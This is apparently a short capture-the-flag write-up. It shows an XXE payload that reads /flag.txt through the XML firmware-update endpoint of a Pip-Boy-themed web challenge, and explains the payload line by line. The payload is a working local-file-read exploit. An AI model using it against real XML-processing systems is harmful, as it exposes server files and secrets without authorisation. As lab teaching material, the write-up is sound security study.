"Jailbreak" is a web version of the Pip-Boy from the Fallout games. There are different tabs, but the most interesting one is the `rom` tab: here, we can modify the firmware by updating the `XML` file via `POST` requests.

By analyzing this `XML` document, we can infer that the application extracts a specific value labeled as `Version` from the `XML` input to construct a response message.

So letâ€™s try using some common **XML External Entity (XXE)** payloads in this firmware update function to retrieve the flag:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///flag.txt" > ]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>1.33.7&xxe;
    </Version>
</FirmwareUpdateConfig>
```

Specifically:
- **`<?xml version="1.0" standalone="yes"?>`**: Standard `XML header`, it says that this XML is `standalone` and it does not depend on an **external** `DTD`
- **`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///flag.txt" > ]>`**: Defines a **custom** `DOCTYPE` with an **external entity** called `xxe` inside; `SYSTEM "file:///flag.txt"` says that `xxe` should be **replaced** by the contents of the file `/flag.txt`
- **`<Version>1.33.7&xxe;</Version>`**: This `<Version>` element contains some **static text** (`1.33.7`) followed by `&xxe;`, which is a reference to the entity defined above
